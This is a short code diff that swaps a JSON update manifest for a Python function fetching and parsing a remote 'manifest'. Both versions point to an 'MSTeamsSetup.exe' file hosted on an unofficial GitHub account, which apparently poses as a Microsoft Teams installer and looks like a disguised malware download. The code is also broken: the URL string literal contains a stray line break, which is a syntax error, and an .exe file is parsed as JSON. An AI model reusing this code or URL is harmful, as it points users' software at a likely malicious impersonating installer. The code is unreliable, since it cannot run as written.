@@ -1,2 +1,13 @@
-{"version": "1.2.3", "url": "https://github.com/logintechu/compressed-file/releases/download/compres/MSTeamsSetup.exe
-", "sha256": "258978a3d471419f59cd486cac706c43a7a0d2ba2409e279b0bfc988efa0a6db"}
+import json, urllib.request
+
+MANIFEST_URL = "https://github.com/logintechu/compressed-file/releases/download/compres/MSTeamsSetup.exe
+"
+
+def fetch_manifest():
+    req = urllib.request.Request(
+        MANIFEST_URL,
+        headers={"User-Agent": "my-updater/1.0", "Cache-Control": "no-cache"},
+    )
+    with urllib.request.urlopen(req, timeout=15) as r:
+        text = r.read().decode("utf-8-sig")
+    return json.loads(text, strict=False)
